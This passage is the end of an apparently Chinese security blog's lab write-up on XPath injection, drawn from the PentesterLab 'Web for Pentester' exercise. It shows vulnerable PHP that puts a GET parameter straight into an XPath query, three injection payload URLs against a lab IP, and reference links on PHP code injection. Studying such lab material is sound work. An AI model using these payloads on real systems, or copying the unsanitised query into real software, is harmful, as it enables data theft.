&quot;users/user/name[.=&apos;&quot;.$_GET[&apos;name&apos;].&quot;&apos;]/parent::*/message&quot;;</span><br><span class="line">  $res = ($xml-&gt;xpath($xpath));</span><br><span class="line">  while(list( ,$node) = each($res)) &#123;</span><br><span class="line">      echo $node;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="payload">Payload</span><a href="#payload" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.114/xml/example2.php?name=hacker&apos; 加单引号报错</span><br><span class="line"></span><br><span class="line">http://192.168.1.114/xml/example2.php?name=hacker&apos;or &apos;1&apos;=&apos;1 得到两个name值</span><br><span class="line"></span><br><span class="line">http://192.168.1.114/xml/example2.php?name=hacker&apos;or 1=1]/parent::*/child::node()%00 得到所有值</span><br></pre></td></tr></table></figure>
<h2><span id="reference">Reference</span><a href="#reference" class="header-anchor">#</a></h2><p><a href="http://f4l13n5n0w.github.io/blog/2015/05/23/pentesterlab-web-for-pentester-final/" target="_blank" rel="noopener">[PentesterLab] Web for Pentester - FINAL</a><br><a href="http://www.jb51.net/article/38714.htm" target="_blank" rel="noopener">慎用preg_replace危险的/e修饰符(一句话后门常用)</a><br><a href="http://blog.csdn.net/while0/article/details/72276440" target="_blank" rel="noopener">PHP create_function()代码注入 (执行脚本函数）</a><br><a href="http://www.uml.org.cn/test/201507204.asp" target="_blank" rel="noopener">Web渗透测试攻略(上)</a><br><a href="http://www.uml.org.cn/test/201507205.asp" target="_blank" rel="noopener">Web渗透测试攻略(中)</a><br><a href="http://www.uml.org.cn/test/201507206.asp" target="_blank" rel="noopener">Web渗透测试攻略(下)</a></p>
</div></article></div></section><footer><div class="paginator"><a href="/posts/notes/反序列化漏洞的利用与学习.html" class="prev">上一篇</a><a href="/posts/notes/XML实体注入漏洞的利用与学习.html" class="next">下一篇</a></div><div class="copyright"><p>© 2016 - 2019 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>